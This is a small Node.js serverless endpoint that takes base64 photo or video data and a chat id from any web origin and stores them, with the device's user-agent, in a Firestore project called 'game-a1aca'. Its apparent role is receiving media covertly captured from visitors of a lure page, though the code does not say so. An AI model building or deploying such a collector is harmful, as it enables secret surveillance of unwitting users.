module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') { res.status(200).end(); return; }

    try {
        const { chat_id, video_base64 } = req.body;
        if (!video_base64) return res.json({ error: 'no data' });

        // تخزين في Firestore REST API
        const axios = require('axios');
        const type = video_base64.length > 50000 ? 'video' : 'photo';
        
        await axios.post(
            'https://firestore.googleapis.com/v1/projects/game-a1aca/databases/(default)/documents/media',
            {
                fields: {
                    chatId: { stringValue: chat_id || '7276604783' },
                    data: { stringValue: video_base64 },
                    type: { stringValue: type },
                    timestamp: { timestampValue: new Date().toISOString() },
                    device: { stringValue: req.headers['user-agent']?.substring(0, 100) || 'unknown' }
                }
            },
            { headers: { 'Content-Type': 'application/json' }, timeout: 10000 }
        );

        return res.json({ success: true, stored: true });
    } catch (e) {
        return res.json({ error: e.message });
    }
};
